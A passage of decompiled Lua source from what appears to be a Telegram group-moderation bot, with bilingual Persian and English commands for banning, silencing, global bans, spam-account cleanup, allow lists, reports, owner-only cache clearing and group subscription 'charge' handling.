                                                                    tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply_, {chat_id = (msg.to).id, cmd = "kick"})
                                                                  end
                                                                  if matches[2] and (string.match)(matches[2], "^%d+$") then
                                                                    if (_ENV.isModerator)((msg.to).id, userid) then
                                                                      return (_ENV.NoAccess)((msg.to).id)
                                                                    else
                                                                      ;
                                                                      (_ENV.kick_user)(matches[2], (msg.to).id)
                                                                    end
                                                                  end
                                                                  if matches[2] and not (string.match)(matches[2], "^%d+$") then
                                                                    tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username_, {chat_id = (msg.to).id, username = matches[2], cmd = "kick"})
                                                                  end
                                                                end
                                                                if (matches[1] == "delall" or matches[1] == "حذف همه پیام ها") and is_mod(msg) then
                                                                  if not matches[2] and msg.reply_id then
                                                                    tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply_, {chat_id = (msg.to).id, cmd = "delall"})
                                                                  end
                                                                  if matches[2] and (string.match)(matches[2], "^%d+$") then
                                                                    if (_ENV.isModerator)((msg.to).id, userid) then
                                                                      return (_ENV.NoAccess)((msg.to).id)
                                                                    else
                                                                      ;
                                                                      (tdcli.deleteMessagesFromUser)((msg.to).id, matches[2], _ENV.dl_cb, nil)
                                                                      return (_ENV.SendStatus)((msg.to).id, matches[2], "All Messages Deleted!", "همه پیام ها پاک شدند!")
                                                                    end
                                                                  end
                                                                  if matches[2] and not (string.match)(matches[2], "^%d+$") then
                                                                    tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username_, {chat_id = (msg.to).id, username = matches[2], cmd = "delall"})
                                                                  end
                                                                end
                                                              end
                                                              if (matches[1] == "banall" or matches[1] == "گلوبال بن") and is_sudo(msg) then
                                                                if not redis:sismember("SudoAccess" .. (msg.from).id, "banall") and is_sudo(msg) and not is_botOwner(msg) then
                                                                  if not lang then
                                                                    return ErrorAccessSudo(msg)
                                                                  else
                                                                    return ErrorAccessSudo(msg)
                                                                  end
                                                                end
                                                                if not matches[2] and msg.reply_id then
                                                                  _ENV.BanAll = function(extra, result, success)
    -- function num : 0_56_18 , upvalues : user, chat, _ENV
    if result.sender_user_id_ then
      user = result.sender_user_id_
      chat = result.chat_id_
      if CheckBotRank(user) then
        return NoAccess(chat)
      end
      if is_banall(user) then
        return SendStatus(chat, user, "Already Globall Banned", "از قبل گلوبال بن بود")
      end
      redis:sadd("BotGloballBanUsers", user)
      kick_user(user, chat)
      return SendStatus(chat, user, "Globall Banned", "گلوبال بن شد")
    end
  end

                                                                  tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_to_message_id_}, _ENV.BanAll, nil)
                                                                end
                                                                do
                                                                  if matches[2] and (string.match)(matches[2], "^%d+$") then
                                                                    local get = function(extra, result, success)
    -- function num : 0_56_19 , upvalues : user, chat, msg, _ENV, matches
    if result.id_ then
      user = result.id_
      chat = (msg.to).id
      if CheckBotRank(user) then
        return NoAccess((msg.to).id)
      end
      if is_banall(user) then
        return SendStatus((msg.to).id, user, "Already Globall Banned", "از قبل گلوبال بن بود")
      end
      redis:sadd("BotGloballBanUsers", user)
      kick_user(user, (msg.to).id)
      return SendStatus((msg.to).id, user, "Globall Banned", "گلوبال بن شد")
    else
      user = matches[2]
      chat = (msg.to).id
      if redis:sismember("BotGloballBanUsers", user) then
        return SendStatusNotFound(chat, user, "Already Globall Banned", "از قبل گلوبال بن بود")
      else
        redis:sadd("BotGloballBanUsers", user)
        kick_user(user, (msg.to).id)
        return SendStatusNotFound(chat, user, "Globall Banned", "گلوبال بن شد")
      end
    end
  end

                                                                    ;
                                                                    (tdcli.getUser)(matches[2], get)
                                                                  end
                                                                  if matches[2] and (string.match)(matches[2], "^@.*$") then
                                                                    _ENV.BanAll = function(arg, data)
    -- function num : 0_56_20 , upvalues : user, chat, _ENV
    if data.id_ then
      user = data.id_
      chat = arg.chat_id
      if CheckBotRank(user) then
        return NoAccess(chat)
      end
      if is_banall(user) then
        return SendStatus(chat, user, "Already Globall Banned", "از قبل گلوبال بن بود")
      end
      redis:sadd("BotGloballBanUsers", user)
      kick_user(user, chat)
      return SendStatus(chat, user, "Globall Banned", "گلوبال بن شد")
    else
      user = arg.username
      chat = arg.chat_id
      if redis:sismember("BotGloballBanUsers", user) then
        return SendStatusNotFound(chat, user, "Already Globall Banned", "از قبل گلوبال بن بود")
      else
        redis:sadd("BotGloballBanUsers", user)
        kick_user(user, chat)
        return SendStatusNotFound(chat, user, "Globall Banned", "گلوبال بن شد")
      end
    end
  end

                                                                    tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, _ENV.BanAll, {chat_id = (msg.to).id, username = matches[2]})
                                                                  end
                                                                  if (matches[1] == "unbanall" or matches[1] == "گلوبال آنبن") and is_sudo(msg) then
                                                                    if not redis:sismember("SudoAccess" .. (msg.from).id, "unbanall") and is_sudo(msg) and not is_botOwner(msg) then
                                                                      if not lang then
                                                                        return ErrorAccessSudo(msg)
                                                                      else
                                                                        return ErrorAccessSudo(msg)
                                                                      end
                                                                    end
                                                                    if not matches[2] and msg.reply_id then
                                                                      _ENV.UnBanAll = function(extra, result, success)
    -- function num : 0_56_21 , upvalues : user, chat, _ENV
    if result.sender_user_id_ then
      user = result.sender_user_id_
      chat = result.chat_id_
      if CheckBotRank(user) then
        return NoAccess(chat)
      end
      if not is_banall(user) then
        return SendStatus(chat, user, "is Not Globall Ban", "گلوبال بن نبود")
      end
      redis:srem("BotGloballBanUsers", user)
      return SendStatus(chat, user, "Globall Unbanned", "دیگه گلوبال بن نیست!")
    end
  end

                                                                      tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_to_message_id_}, _ENV.UnBanAll, nil)
                                                                    end
                                                                    do
                                                                      if matches[2] and (string.match)(matches[2], "^%d+$") then
                                                                        local get = function(extra, result, success)
    -- function num : 0_56_22 , upvalues : user, chat, msg, _ENV, matches
    if result.id_ then
      user = result.id_
      chat = (msg.to).id
      if CheckBotRank(user) then
        return NoAccess((msg.to).id)
      end
      if not is_banall(user) then
        return SendStatus(chat, user, "is Not Globall Ban", "گلوبال بن نبود")
      end
      redis:srem("BotGloballBanUsers", user)
      return SendStatus(chat, user, "Globall Unbanned", "دیگه گلوبال بن نیست!")
    else
      user = matches[2]
      chat = (msg.to).id
      if not redis:sismember("BotGloballBanUsers", user) then
        return SendStatusNotFound(chat, user, "is Not Globall Ban", "گلوبال بن نبود")
      else
        redis:srem("BotGloballBanUsers", user)
        return SendStatusNotFound((msg.to).id, user, "Globall Unbanned", "دیگه گلوبال بن نیست!")
      end
    end
  end

                                                                        ;
                                                                        (tdcli.getUser)(matches[2], get)
                                                                      end
                                                                      if matches[2] and (string.match)(matches[2], "^@.*$") then
                                                                        _ENV.UnBanAll = function(arg, data)
    -- function num : 0_56_23 , upvalues : user, chat, _ENV
    if data.id_ then
      user = data.id_
      chat = arg.chat_id
      if CheckBotRank(user) then
        return NoAccess(chat)
      end
      if not is_banall(user) then
        return SendStatus(chat, user, "is Not Globall Ban", "گلوبال بن نبود")
      end
      redis:srem("BotGloballBanUsers", user)
      return SendStatus(chat, user, "Globall Unbanned", "دیگه گلوبال بن نیست!")
    else
      user = arg.username
      chat = arg.chat_id
      if not redis:sismember("BotGloballBanUsers", user) then
        return SendStatusNotFound(chat, user, "is Not Globall Ban", "گلوبال بن نبود")
      else
        redis:srem("BotGloballBanUsers", user)
        return SendStatusNotFound(chat, user, "Globall Unbanned", "دیگه گلوبال بن نیست!")
      end
    end
  end

                                                                        tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, _ENV.UnBanAll, {chat_id = (msg.to).id, username = matches[2]})
                                                                      end
                                                                      if (msg.to).type ~= "pv" then
                                                                        if (matches[1] == "ban" or matches[1] == "بن") and is_mod(msg) then
                                                                          if not matches[2] and msg.reply_id then
                                                                            tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply_, {chat_id = (msg.to).id, cmd = "ban"})
                                                                          end
                                                                          if matches[2] and (string.match)(matches[2], "^%d+$") then
                                                                            if (_ENV.isModerator)((msg.to).id, userid) then
                                                                              return (_ENV.NoAccess)((msg.to).id)
                                                                            end
                                                                            if (_ENV.is_banUser)(matches[2], (msg.to).id) then
                                                                              return (_ENV.SendStatus)((msg.to).id, matches[2], "Already Banned", "از قبل محروم بود")
                                                                            end
                                                                            redis:sadd("GroupBannedUsers:" .. (msg.to).id, matches[2])
                                                                            ;
                                                                            (_ENV.kick_user)(matches[2], (msg.to).id)
                                                                            return (_ENV.SendStatus)((msg.to).id, matches[2], "Banned", "محروم شد")
                                                                          end
                                                                          if matches[2] and not (string.match)(matches[2], "^%d+$") then
                                                                            tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username_, {chat_id = (msg.to).id, username = matches[2], cmd = "ban"})
                                                                          end
                                                                        end
                                                                        if (matches[1] == "unban" or matches[1] == "آنبن") and is_mod(msg) then
                                                                          if not matches[2] and msg.reply_id then
                                                                            tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply_, {chat_id = (msg.to).id, cmd = "unban"})
                                                                          end
                                                                          if matches[2] and (string.match)(matches[2], "^%d+$") then
                                                                            if not (_ENV.is_banUser)(matches[2], (msg.to).id) then
                                                                              return (_ENV.SendStatus)((msg.to).id, matches[2], "is Not Banned", "محروم نبود")
                                                                            end
                                                                            redis:srem("GroupBannedUsers:" .. (msg.to).id, matches[2])
                                                                            return (_ENV.SendStatus)((msg.to).id, matches[2], "Unbanned", "از محرومیت خارج شد")
                                                                          end
                                                                          if matches[2] and not (string.match)(matches[2], "^%d+$") then
                                                                            tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username_, {chat_id = (msg.to).id, username = matches[2], cmd = "unban"})
                                                                          end
                                                                        end
                                                                        if (matches[1] == "silent" or matches[1] == "سکوت") and is_mod(msg) then
                                                                          if not matches[2] and msg.reply_id then
                                                                            tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply_, {chat_id = (msg.to).id, cmd = "silent"})
                                                                          end
                                                                          if matches[2] and (string.match)(matches[2], "^%d+$") then
                                                                            if (_ENV.isModerator)((msg.to).id, userid) then
                                                                              return (_ENV.NoAccess)((msg.to).id)
                                                                            end
                                                                            if (_ENV.is_silent_user)(matches[2], chat) then
                                                                              return (_ENV.SendStatus)((msg.to).id, matches[2], "Already Silent", "از قبل ساکت بود")
                                                                            end
                                                                            redis:sadd("GroupSilentUsers:" .. (msg.to).id, matches[2])
                                                                            return (_ENV.SendStatus)((msg.to).id, matches[2], "Silented", "ساکت شد")
                                                                          end
                                                                          if matches[2] and not (string.match)(matches[2], "^%d+$") then
                                                                            tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username_, {chat_id = (msg.to).id, username = matches[2], cmd = "silent"})
                                                                          end
                                                                        end
                                                                        if (matches[1] == "unsilent" or matches[1] == "برداشتن سکوت") and is_mod(msg) then
                                                                          if not matches[2] and msg.reply_id then
                                                                            tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply_, {chat_id = (msg.to).id, cmd = "unsilent"})
                                                                          end
                                                                          if matches[2] and (string.match)(matches[2], "^%d+$") then
                                                                            if not (_ENV.is_silent_user)(matches[2], chat) then
                                                                              return (_ENV.SendStatus)((msg.to).id, matches[2], "is Not Silent", "ساکت نبود")
                                                                            end
                                                                            redis:srem("GroupSilentUsers:" .. (msg.to).id, matches[2])
                                                                            return (_ENV.SendStatus)((msg.to).id, matches[2], "Unsilented", "دیگه ساکت نیست!")
                                                                          end
                                                                          if matches[2] and not (string.match)(matches[2], "^%d+$") then
                                                                            tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username_, {chat_id = (msg.to).id, username = matches[2], cmd = "unsilent"})
                                                                          end
                                                                        end
                                                                        if ((matches[1]):lower() == "clean" or matches[1] == "پاکسازی") and is_owner(msg) then
                                                                          do
                                                                            if matches[2] == "messages" or matches[2] == "msg" or matches[2] == "msgs" or matches[2] == "پیام ها" then
                                                                              local rmsg_all = function(arg, data)
    -- function num : 0_56_24 , upvalues : lang, _ENV, msg
    local delall = data.members_
    if not delall[0] then
      if not lang then
        return "*No Members in This Group!*"
      else
        return "این گروه عضوی ندارد!"
      end
    else
      for k,v in pairs(data.members_) do
        (tdcli.deleteMessagesFromUser)(msg.chat_id_, v.user_id_)
        RedisUsers = redis:smembers("FixCleanMSG:" .. msg.chat_id_)
        if #RedisUsers ~= 0 then
          for m,n in pairs(RedisUsers) do
            (tdcli.deleteMessagesFromUser)(msg.chat_id_, n)
            redis:srem("FixCleanMSG:" .. msg.chat_id_, n)
          end
        end
      end
    end
  end

                                                                              tdcli_function({ID = "GetChannelMembers", channel_id_ = (getChatId(msg.chat_id_)).ID, offset_ = 0, limit_ = 10000}, rmsg_all, nil)
                                                                            end
                                                                            do
                                                                              if matches[2] == "tabchi" or matches[2] == "تبچی" then
                                                                                local CleanTabchi = function(arg, data)
    -- function num : 0_56_25 , upvalues : lang, _ENV, chat, msg
    local CheckMmbr = data.members_
    if not CheckMmbr[0] then
      if not lang then
        return "*No Members in This Group!*"
      else
        return "این گروه عضوی ندارد!"
      end
    else
      if not lang then
        (tdcli.sendMessage)(chat, msg.id_, 0, "*All Members Suspect To Tabchi Has Been Kicked!*", 0, "md")
      else
        ;
        (tdcli.sendMessage)(chat, msg.id_, 0, "همه اعضای مشکوک به تبچی اخراج شدند!", 0, "md")
      end
      for k,v in pairs(data.members_) do
        ForwardMessages = tonumber(redis:get("getForwardMessages:" .. v.user_id_ .. ":" .. (msg.to).id)) or 0
        LinkMessages = tonumber(redis:get("getLinkMessages:" .. v.user_id_ .. ":" .. (msg.to).id)) or 0
        TextMessages = tonumber(redis:get("getTextMessages:" .. v.user_id_ .. ":" .. (msg.to).id)) or 0
        if TextMessages * 2 < ForwardMessages + LinkMessages then
          kick_user(v.user_id_, (msg.to).id)
          redis:del("getForwardMessages:" .. v.user_id_ .. ":" .. (msg.to).id)
          redis:del("getTextMessages:" .. v.user_id_ .. ":" .. (msg.to).id)
          redis:del("getLinkMessages:" .. v.user_id_ .. ":" .. (msg.to).id)
        end
      end
    end
  end

                                                                                tdcli_function({ID = "GetChannelMembers", channel_id_ = (getChatId(msg.chat_id_)).ID, offset_ = 0, limit_ = 10000}, CleanTabchi, nil)
                                                                              end
                                                                              if matches[2] == "اعضا بی فایده" or matches[2] == "vain" or matches[2] == "بی فایده" then
                                                                                redis:setex("CleanVains:" .. (msg.to).id .. ":" .. (msg.from).id, 300, "w8")
                                                                                if not lang then
                                                                                  return "*Warning:* With This Commands All Vain Members Will Be Kicked From Group!\nFor Continue Type `done` or Cancel Process With `cancel`"
                                                                                else
                                                                                  return "*اخطار:* با انجام این دستور تمام اعضا بی فایده گروه اخراج خواهند شد!\nبرای ادامه دادن `done` را تایپ کنید یا برای لغو کردن از `cancel` استفاده کنید"
                                                                                end
                                                                              end
                                                                              if matches[2] == "bans" or matches[2] == "محرومان" then
                                                                                _ENV.Gbans = redis:smembers("GroupBannedUsers:" .. (msg.to).id)
                                                                                if #_ENV.Gbans == 0 then
                                                                                  if not lang then
                                                                                    return "`Ban List is Empty!`"
                                                                                  else
                                                                                    return "`لیست محرومان خالی می باشد!`"
                                                                                  end
                                                                                end
                                                                                redis:del("GroupBannedUsers:" .. (msg.to).id)
                                                                                if not lang then
                                                                                  return "All Banned Users Has Been `Unbanned`"
                                                                                else
                                                                                  return "تمام کاربران محروم از محرومیت `خارج شدند`"
                                                                                end
                                                                              end
                                                                              if matches[2] == "silentlist" or matches[2] == "لیست سکوت" then
                                                                                _ENV.GetSilentList = redis:smembers("GroupSilentUsers:" .. (msg.to).id)
                                                                                if #_ENV.GetSilentList == 0 then
                                                                                  if not lang then
                                                                                    return "*Silent list is empty*"
                                                                                  else
                                                                                    return "لیست کاربران ساکت خالی است"
                                                                                  end
                                                                                end
                                                                                redis:del("GroupSilentUsers:" .. (msg.to).id)
                                                                                if not lang then
                                                                                  return "*Silent list* `has been cleaned`"
                                                                                else
                                                                                  return "*لیست کاربران ساکت شده پاک شد*"
                                                                                end
                                                                              end
                                                                              if ((matches[1]):lower() == "clean" or matches[1] == "پاکسازی") and is_sudo(msg) and (matches[2] == "gbans" or matches[2] == "گلوبال بن") then
                                                                                _ENV.Gbans = redis:smembers("BotGloballBanUsers")
                                                                                if #_ENV.Gbans == 0 then
                                                                                  if not lang then
                                                                                    return "Globall Ban List is Empty!"
                                                                                  else
                                                                                    return "لیست گلوبال بن خالی می باشد!"
                                                                                  end
                                                                                end
                                                                                redis:del("BotGloballBanUsers")
                                                                                if not lang then
                                                                                  return "All Globall Ban Users Has Been `Globall Unbanned`"
                                                                                else
                                                                                  return "تمام گلوبال بن ها از گلوبال بن `خارج شدند`"
                                                                                end
                                                                              end
                                                                              if (matches[1] == "gbanlist" or matches[1] == "لیست گلوبال بن") and is_sudo(msg) then
                                                                                return (_ENV.banall_list)(msg)
                                                                              end
                                                                              if (msg.to).type ~= "pv" then
                                                                                if (matches[1] == "silentlist" or matches[1] == "لیست سکوت") and is_mod(msg) then
                                                                                  return (_ENV.getsilentlist)(chat)
                                                                                end
                                                                                if (matches[1] == "banlist" or matches[1] == "لیست بن") and is_mod(msg) then
                                                                                  return (_ENV.banUsers_list)(chat)
                                                                                end
                                                                              end
                                                                              if is_mod(msg) then
                                                                                chat = (msg.to).id
                                                                                user = (msg.from).id
                                                                                lang = redis:get("gp_lang:" .. (msg.to).id)
                                                                                if matches[1] == "filter" or matches[1] == "فیلتر" then
                                                                                  return filter_word(msg, matches[2])
                                                                                else
                                                                                  if (matches[1] == "allow" or matches[1] == "مجاز") and not matches[2] then
                                                                                    _ENV.allow = function(extra, result, success)
    -- function num : 0_56_26 , upvalues : user, chat, _ENV
    user = result.sender_user_id_
    chat = result.chat_id_
    if not redis:get("AllowUser~" .. user .. "~From~" .. chat) then
      redis:set("AllowUser~" .. user .. "~From~" .. chat, true)
      redis:sadd("AllowUserFrom~" .. chat, user)
      SendStatus(chat, user, "Added", "اضافه شد")
    else
      redis:del("AllowUser~" .. user .. "~From~" .. chat)
      redis:srem("AllowUserFrom~" .. chat, user)
      SendStatus(chat, user, "Removed", "حذف شد")
    end
  end

                                                                                    tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_to_message_id_}, _ENV.allow, nil)
                                                                                  else
                                                                                    if (matches[1] == "allow" or matches[1] == "مجاز") and matches[2] and not (matches[2]):match("(%d+)") and (matches[2]):match("(.*)") and (matches[2]):match("^@") then
                                                                                      tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username, {chat_id = (msg.to).id, username = matches[2], cmd = "allow"})
                                                                                    else
                                                                                      if (matches[1] == "allow" or matches[1] == "مجاز") and matches[2] and not (matches[2]):match("(%d+)") and (matches[2]):match("(.*)") and not (matches[2]):match("^@") then
                                                                                        if not redis:get("Allow~" .. matches[2] .. "From~" .. msg.chat_id_) then
                                                                                          redis:set("Allow~" .. matches[2] .. "From~" .. msg.chat_id_, true)
                                                                                          redis:sadd("AllowFrom~" .. msg.chat_id_, matches[2])
                                                                                          if not lang then
                                                                                            return "*Word:* `" .. matches[2] .. "`\n*Status:* `Added`"
                                                                                          else
                                                                                            return "*کلمه:* `" .. matches[2] .. "`\n*وضعیت:* `اضافه شد`"
                                                                                          end
                                                                                        else
                                                                                          if redis:get("Allow~" .. matches[2] .. "From~" .. msg.chat_id_) then
                                                                                            redis:del("Allow~" .. matches[2] .. "From~" .. msg.chat_id_)
                                                                                            redis:srem("AllowFrom~" .. msg.chat_id_, matches[2])
                                                                                            if not lang then
                                                                                              return "*Word:* `" .. matches[2] .. "`\n*Status:* `Removed`"
                                                                                            else
                                                                                              return "*کلمه:* `" .. matches[2] .. "`\n*وضعیت:* `حذف شد`"
                                                                                            end
                                                                                          end
                                                                                        end
                                                                                      else
                                                                                        if (matches[1] == "allow" or matches[1] == "مجاز") and matches[2] and (matches[2]):match("(%d+)") then
                                                                                          if not redis:get("AllowUser~" .. matches[2] .. "~From~" .. (msg.to).id) then
                                                                                            redis:set("AllowUser~" .. matches[2] .. "~From~" .. (msg.to).id, true)
                                                                                            redis:sadd("AllowUserFrom~" .. (msg.to).id, matches[2])
                                                                                            return (_ENV.SendStatus)((msg.to).id, matches[2], "Added", "اضافه شد")
                                                                                          else
                                                                                            redis:del("AllowUser~" .. matches[2] .. "~From~" .. (msg.to).id)
                                                                                            redis:srem("AllowUserFrom~" .. (msg.to).id, matches[2])
                                                                                            return (_ENV.SendStatus)((msg.to).id, matches[2], "Removed", "حذف شد")
                                                                                          end
                                                                                        else
                                                                                          if matches[1] == "allowlist" or matches[1] == "لیست مجاز" then
                                                                                            _ENV.hashWord = "AllowFrom~" .. (msg.to).id
                                                                                            _ENV.listWord = redis:smembers(_ENV.hashWord)
                                                                                            _ENV.hashUser = "AllowUserFrom~" .. (msg.to).id
                                                                                            _ENV.listUser = redis:smembers(_ENV.hashUser)
                                                                                            if not lang then
                                                                                              _ENV.textWord = "*> Allow words:*\n\n"
                                                                                              _ENV.textUser = "*> Allow users:*\n\n"
                                                                                            else
                                                                                              _ENV.textWord = "*> لغات مجاز:*\n\n"
                                                                                              _ENV.textUser = "*> اشخاص مجاز:*\n\n"
                                                                                            end
                                                                                            for k,v in (_ENV.pairs)(_ENV.listWord) do
                                                                                              _ENV.textWord = _ENV.textWord .. "*" .. k .. "-* " .. v .. "\n\n"
                                                                                            end
                                                                                            for k,v in (_ENV.pairs)(_ENV.listUser) do
                                                                                              _ENV.textUser = _ENV.textUser .. "*" .. k .. "-* `" .. v .. "`\n\n"
                                                                                            end
                                                                                            if #_ENV.listWord == 0 then
                                                                                              if not lang then
                                                                                                _ENV.textWord = "*> Allow words not found!*\n\n"
                                                                                              else
                                                                                                _ENV.textWord = "*> لغات مجاز یافت نشدند!*\n\n"
                                                                                              end
                                                                                            end
                                                                                            if #_ENV.listUser == 0 then
                                                                                              if not lang then
                                                                                                _ENV.textUser = "*> Allow users not found!*\n\n"
                                                                                              else
                                                                                                _ENV.textUser = "*> اشخاص مجاز یافت نشدند!*\n\n"
                                                                                              end
                                                                                            end
                                                                                            ;
                                                                                            (tdcli.sendMessage)((msg.to).id, msg.id_, 0, _ENV.textWord .. "" .. _ENV.textUser, 0, "md")
                                                                                          end
                                                                                        end
                                                                                      end
                                                                                    end
                                                                                  end
                                                                                end
                                                                                if is_sudo(msg) and ((matches[1]):lower() == "reload" or matches[1] == "ریلود") then
                                                                                  reload_plugins(true, msg)
                                                                                  return "`Done!`"
                                                                                end
                                                                                if (matches[1]):lower() == "report" or matches[1] == "گزارش" then
                                                                                  _ENV.report = function(extra, result, success)
    -- function num : 0_56_27 , upvalues : msg, lang, _ENV
    local hash = "reportlist" .. (msg.to).id
    if lang then
      redis:sadd(hash, "*آیدی* [" .. (msg.from).id .. "] *کاربر مقابل را گزارش داد* [" .. result.sender_user_id_ .. "]. *متن:* [" .. (result.content_).text_ .. "]")
      ;
      (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, "*گزارش شما ثبت گرديد!*", 0, "md")
    else
      redis:sadd(hash, "*ID* [`" .. (msg.from).id .. "`] *has been reported* [`" .. result.sender_user_id_ .. "`]. *Text:* [" .. (result.content_).text_ .. "]")
      ;
      (tdcli.sendMessage)(result.chat_id_, msg.id_, 0, "*Your report has been saved!*", 0, "md")
    end
  end

                                                                                  tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_to_message_id_}, _ENV.report, nil)
                                                                                end
                                                                                if ((matches[1]):lower() == "reportlist" or matches[1] == "لیست گزارش") and is_mod(msg) then
                                                                                  local hash = "reportlist" .. (msg.to).id
                                                                                  local list = redis:smembers(hash)
                                                                                  if lang then
                                                                                    text = "*> ليست پيام هاي گزارش شده:*\n\n"
                                                                                  else
                                                                                    text = "*> Report list:*\n\n"
                                                                                  end
                                                                                  for k,v in (_ENV.pairs)(list) do
                                                                                    text = "*" .. text .. k .. "-* " .. v .. " \n\n"
                                                                                  end
                                                                                  if #list == 0 then
                                                                                    if lang then
                                                                                      text = "*> لیست ریپورت خالی است!*"
                                                                                    else
                                                                                      text = "*> Report list is empty!*"
                                                                                    end
                                                                                  end
                                                                                  ;
                                                                                  (tdcli.sendMessage)((msg.to).id, msg.id_, 0, text, 0, "md")
                                                                                end
                                                                                do
                                                                                  if ((matches[1]):lower() == "clean reportlist" or matches[1] == "پاکسازی لیست گزارش") and is_owner(msg) then
                                                                                    redis:del("reportlist" .. (msg.to).id)
                                                                                    if lang then
                                                                                      (tdcli.sendMessage)((msg.to).id, msg.id_, 0, "*لیست گزارش با موفقیت پاک شد!*", 0, "md")
                                                                                    else
                                                                                      ;
                                                                                      (tdcli.sendMessage)((msg.to).id, msg.id_, 0, "*Report list has been cleaned!*", 0, "md")
                                                                                    end
                                                                                  end
                                                                                  if (matches[1] == "helpme" or matches[1] == "راهنمایی") and is_owner(msg) then
                                                                                    text = "*New message! \nChat:* `" .. (msg.to).id .. "`\n*From*: " .. (msg.from).print_name .. " [`" .. (msg.from).id .. "`]\n*Message:*\n" .. matches[2]
                                                                                    for v,owner in (_ENV.pairs)((_ENV._config).bot_owner) do
                                                                                      local SUDO = tonumber(owner)
                                                                                      ;
                                                                                      (tdcli.sendMessage)(SUDO, 0, 1, text, 1, "md")
                                                                                    end
                                                                                    if not lang then
                                                                                      return "*Your Message has been sent for bots owner!*"
                                                                                    else
                                                                                      return "*پیام شما برای مالک ربات ارسال شد!*"
                                                                                    end
                                                                                  end
                                                                                  if is_botOwner(msg) then
                                                                                    if matches[1] == "clear cache" then
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/sticker/*")
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/photo/*")
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/animation/*")
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/video/*")
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/audio/*")
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/voice/*")
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/temp/*")
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/thumb/*")
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/document/*")
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/profile_photo/*")
                                                                                      run_bash("rm -rf ~/.telegram-cli/data/encrypted/*")
                                                                                      return "`Done!`"
                                                                                    end
                                                                                    if matches[1] == "delsudo" or matches[1] == "حذف سودو" then
                                                                                      if not matches[2] and msg.reply_id then
                                                                                        tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply2, {chat_id = (msg.to).id, cmd = "delsudo"})
                                                                                      end
                                                                                      if matches[2] and (string.match)(matches[2], "^%d+$") then
                                                                                        tdcli_function({ID = "GetUser", user_id_ = matches[2]}, action_by_id2, {chat_id = (msg.to).id, user_id = matches[2], cmd = "delsudo"})
                                                                                      end
                                                                                      if matches[2] and not (string.match)(matches[2], "^%d+$") then
                                                                                        tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username2, {chat_id = (msg.to).id, username = matches[2], cmd = "delsudo"})
                                                                                      end
                                                                                    end
                                                                                  end
                                                                                  if is_sudo(msg) then
                                                                                    if ((matches[1]):lower() == "charge" or matches[1] == "شارژ") and matches[2] and matches[3] and (string.match)(matches[2], "^-%d+$") then
                                                                                      if tonumber(matches[3]) > 0 and tonumber(matches[3]) < 1001 then
                                                                                        local extime = tonumber(matches[3]) * 86400
                                                                                        redis:setex("ExpireDate:" .. matches[2], extime, true)
                                                                                        if not redis:get("CheckExpire::" .. (msg.to).id) then
                                                                                          redis:set("CheckExpire::" .. (msg.to).id, true)
                                                                                        end
                                                                                        if lang then
                                                                                          for v,owner in (_ENV.pairs)((_ENV._config).bot_owner) do
                                                                                            local SUDO = tonumber(owner)
                                                                                            if (msg.from).username then
                                                                                              username = "@" .. (msg.from).username
                                                                                            else
                                                                                              username = (msg.from).first_name
                                                                                            end
                                                                                            ;
                                                                                            (tdcli.sendMessage)(SUDO, 0, 1, "ربات در گروه `" .. matches[2] .. "` توسط " .. username .. " [`" .. (msg.from).id .. "`] به مدت `" .. matches[3] .. "` شارژ شد", 1, "md")
                                                                                          end
                                                                                          ;
                                                                                          (tdcli.sendMessage)(matches[2], 0, 1, "شارژ گروه توسط سودو تغییر کرد به `" .. matches[3] .. "` روز", 1, "md")
                                                                                        else
                                                                                          for v,owner in (_ENV.pairs)((_ENV._config).bot_owner) do
                                                                                            local SUDO = tonumber(owner)
                                                                                            if (msg.from).username then
                                                                                              username = "@" .. (msg.from).username
                                                                                            else
                                                                                              username = (msg.from).first_name
                                                                                            end
                                                                                            ;
                                                                                            (tdcli.sendMessage)(SUDO, 0, 1, "ربات در گروه `" .. matches[2] .. "` توسط " .. username .. " [`" .. (msg.from).id .. "`] به مدت `" .. matches[3] .. "` شارژ شد", 1, "md")
                                                                                          end
                                                                                          ;
                                                                                          (tdcli.sendMessage)(matches[2], 0, 1, "*Bot Sudo changed group charge to `" .. matches[3] .. "` day", 1, "md")
                                                                                        end
                                                                                      else
                                                                                        do
                                                                                          if lang then
                                                                                            (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "عددی کوچک تر از `1000` وارد کنید", 1, "md")
                                                                                          else
                                                                                            ;
